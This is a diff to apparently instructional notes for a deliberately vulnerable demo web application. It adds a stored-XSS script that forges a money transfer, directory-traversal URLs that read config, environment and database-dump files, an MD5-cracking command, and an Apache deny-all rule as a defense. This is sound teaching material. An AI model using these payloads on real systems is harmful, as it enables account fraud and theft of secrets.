@@ -24,15 +24,43 @@
 - need also XSS
 - create new transaction
 - add description insert
+
 ```
 <script>
 $.post({
     url:'index.php',
-    data:'receiver=11&amount=10&desc=attack&submit=create'
-}).success(function(data) {
+    data:'receiver=1&amount=10&desc=attack&submit=create'
+}).done(function(data) {
     console.log('Attack was successful');
 });
 </script>
+```
+
+#### Directory traversal
+try following URLs
+- http://localhost:8088/docker-compose.yml
+- http://localhost:8088/config/app.env
+- http://localhost:8088/dumps/zcu_demo.sql
+
+##### Defense
+Adjust apache configuration
+```
+# denied all files
+<RequireAll>
+    Require all denied
+</RequireAll>
+
+# whitelist only *.php and other files
+<FilesMatch "((^$)|(^.+\.(php|css|map|js)$))">
+    Require all granted
+</FilesMatch>
+```
+
+
+#### Weak hash algorithm
+try use `hashcat`
+```
+php scripts/crack_md5_hash.php 75b71aa6842e450f12aca00fdf54c51d
 ```
 
 ### Docker tips
